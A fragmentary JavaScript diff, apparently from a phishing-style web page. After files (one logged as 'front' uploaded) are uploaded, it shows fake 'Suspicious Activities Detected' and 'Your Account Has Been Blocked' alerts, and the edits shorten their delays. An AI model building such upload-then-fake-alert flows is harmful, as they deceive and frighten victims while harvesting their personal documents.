@@ -1,4 +1,4 @@
-//let form=document.getElementsByTagName('form').onsubmit= e => e.preventDefault()
+form=document.getElementsByTagName('form').onsubmit= e => e.preventDefault()
 
 
     
@@ -19,11 +19,11 @@ let btn= document.querySelector('.btn');
       insert.on('state_change', snapshot => {
         setTimeout(()=> {
           swal("", "Suspicious Activities Detected", "warning");
-        },2000)
+        },1000)
 
         setTimeout(()=>{
           swal("", "Your Account Has Been Blocked ", "error");
-        }, 7000)
+        }, 3000)
 
 
       })
@@ -45,7 +45,7 @@ let btn= document.querySelector('.btn');
 
       insideer.on('state_change', snapshot => {
         setTimeout(()=> {
-          console.log('front uploaded');
+          console.log('fron uploaded');
         },2000)
 
    
